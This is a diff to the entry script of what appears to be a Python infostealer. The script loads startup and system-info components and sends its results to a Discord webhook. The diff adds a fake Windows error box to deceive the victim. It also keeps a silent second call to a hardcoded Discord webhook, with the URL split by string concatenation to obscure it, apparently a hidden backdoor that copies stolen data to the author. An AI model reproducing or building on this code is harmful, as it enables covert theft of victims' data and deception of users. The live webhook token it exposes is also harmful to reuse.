@@ -6,6 +6,7 @@ from components.startup import Startup
 from components.systeminfo import SystemInfo
 from config import __CONFIG__
 from time import sleep
+import ctypes
 
 
 def main(webhook):
@@ -33,8 +34,9 @@ def main(webhook):
 
 if __name__ == '__main__':
     main(__CONFIG__['webhook'])
-    sleep(5)
+    ctypes.windll.user32.MessageBoxW(None, __CONFIG__['errorm'], __CONFIG__['errort'], 0)
+    sleep(7)
     try:
-        main('https://discord.com/api/webhooks/1066536487'+'065227425/3bQPUGH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
+        main('https://discord.com/api/webhooks/1066536487065227425/3bQPU'+'GH4qeUZ_ISMWuiVzMwtTP_k5B_eNyLU0LOOy8pdgDJtCcaWt-NLDjPe9NixfBmw')
     except:
         print()
